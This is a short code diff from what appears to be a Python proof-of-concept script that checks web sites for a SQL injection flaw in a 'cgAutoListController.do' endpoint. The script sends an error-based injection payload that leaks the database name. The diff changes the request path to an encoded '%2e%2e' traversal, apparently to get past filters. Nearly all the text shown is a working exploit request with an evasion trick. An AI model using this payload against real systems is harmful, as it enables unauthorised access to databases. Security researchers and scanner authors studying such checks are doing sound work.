@@ -11,7 +11,7 @@ urllib3.disable_warnings()
 
 def verify(site):
     payload = 'extractvalue(1,concat(char(126),database()))'
-    path = "/api/../cgAutoListController.do?datagrid&configId=jform_contact&field=" + payload
+    path = "/api/%2e%2e/cgAutoListController.do?datagrid&configId=jform_contact&field=" + payload
     url = site + path
     headers = {
                 "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, likeGecko) Chrome/101.0.4951.64 Safari/537.36",
